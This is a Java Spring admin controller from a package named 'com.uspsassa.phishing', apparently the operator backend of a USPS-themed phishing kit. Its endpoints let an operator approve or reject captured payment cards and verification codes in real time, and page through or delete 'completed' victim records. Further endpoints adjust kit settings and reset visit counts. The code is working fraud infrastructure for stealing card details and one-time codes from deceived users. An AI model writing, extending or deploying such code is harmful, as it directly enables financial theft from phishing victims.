package com.uspsassa.phishing.controller;
import cn.hutool.core.convert.Convert;
import com.uspsassa.phishing.common.result.Result;
import com.uspsassa.phishing.entity.FishComplet;
import com.uspsassa.phishing.entity.Setting;
import com.uspsassa.phishing.request.PageRequest;
import com.uspsassa.phishing.request.admin.LoginRequest;
import com.uspsassa.phishing.request.admin.QueryCompleteRequest;
import com.uspsassa.phishing.request.admin.UpdateSettingRequest;
import com.uspsassa.phishing.service.AdminService;
import com.uspsassa.phishing.service.FishService;
import com.uspsassa.phishing.service.SettingService;
import com.uspsassa.phishing.vo.AdminVo;
import com.uspsassa.phishing.vo.FishVo;
import com.uspsassa.phishing.vo.PageResult;
import com.uspsassa.phishing.vo.SystemCount;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import javax.validation.constraints.NotNull;
import java.io.IOException;
import java.util.List;

@RestController
@RequestMapping("admin")
@Tag(name = "管理员模块")
public class AdminController {
    @Resource
    AdminService adminService;
    @Resource
    FishService fishService;
    @Resource
    SettingService settingService;

    @Operation(summary = "管理员登录",description = "返回token 并且每一次请求token快过期了 都会重新生成一个token放在请求头 自己全局处理" )
    @PostMapping("login")
    public AdminVo login(@RequestBody @Validated LoginRequest loginRequest) {
        return adminService.login(loginRequest);
    }
    @Operation(summary = "获取处理列表",description = "这东西可不兴刷新同步 数据同步是通过socket来的 当然你轮询自己判断 我也不会说什么")
    @PostMapping("getInfoList")
    public List<FishVo> getInfoList() {
       return fishService.getInfoList();
    }
    @Operation(summary = "卡放行",description = " 返回全部信息或者空 空是同步 如果是同步自己把这一条信息删掉")
    @PostMapping("cardPass")
    public Result<FishVo> cardPass(Integer id) throws IOException {
        FishVo pass = fishService.cardPass(id);
        return Result.success(pass);
    }
    @Operation(summary = "卡拒绝",description = "返回全部信息 自己更新")
    @PostMapping("cardReject")
    public Result<FishVo> cardReject(Integer id) throws IOException {
        FishVo reject = fishService.cardReject(id);
        return Result.success(reject);
    }
    @Operation(summary = "验证码放行",description = " 无返回值 自己把这一条信息删掉")
    @PostMapping("codePass")
    public Result<Void> codePass(Integer id) throws IOException {
        fishService.codePass(id);
        return Result.success();
    }
    @Operation(summary = "验证码拒绝",description = "返回全部信息用于更新")
    @PostMapping("codeReject")
    public Result<FishVo> codeReject(Integer id) throws IOException {
        FishVo fishVo = fishService.codeReject(id);
        return Result.success(fishVo);
    }
    @Operation(summary = "条件获取并分页已完成信息")
    @PostMapping("getFinishInfoListPage")
    public Result<PageResult<FishComplet>> getFinishInfoListPage(@RequestBody @Validated PageRequest<QueryCompleteRequest> pageRequest) {
        PageResult<FishComplet> finishInfo = fishService.getFinishInfo(pageRequest);
        return Result.success(finishInfo);
    }
    @Operation(summary = "删除已完成信息")
    @PostMapping("deleteCompleteInfo")
    public Result<Void> delete(@RequestParam @Validated @NotNull Integer id) {
        fishService.deleteCompleteInfo(id);
        return Result.success();
    }
    @Operation(summary = "更新配置信息",description = "配置修改")
    @PostMapping("updateConfig")
    public Result<Void> updateConfig(@RequestBody @Validated UpdateSettingRequest fishVo) {
        settingService.updateSetting(Convert.convert(com.uspsassa.phishing.entity.Setting.class,fishVo));
        return Result.success();
    }
    @Operation(summary = "获取配置信息",description = "配置修改")
    @PostMapping("getConfig")
    public Result<Setting> getConfig() {
        Setting setting = Convert.convert(Setting.class,settingService.getSetting());
        return Result.success(setting);
    }
    @Operation(summary = "获取系统统计")
    @PostMapping("getSystemCount")
    public Result<SystemCount> getSystemCount() {
        SystemCount systemCount = fishService.getSystemCount();
        return Result.success(systemCount);
    }
    @Operation(summary = "清空访问量")
    @PostMapping("clearVisitCount")
    public Result<Void> clearVisitCount(){
        settingService.clearVisitCount();
        return Result.success();
    }
}
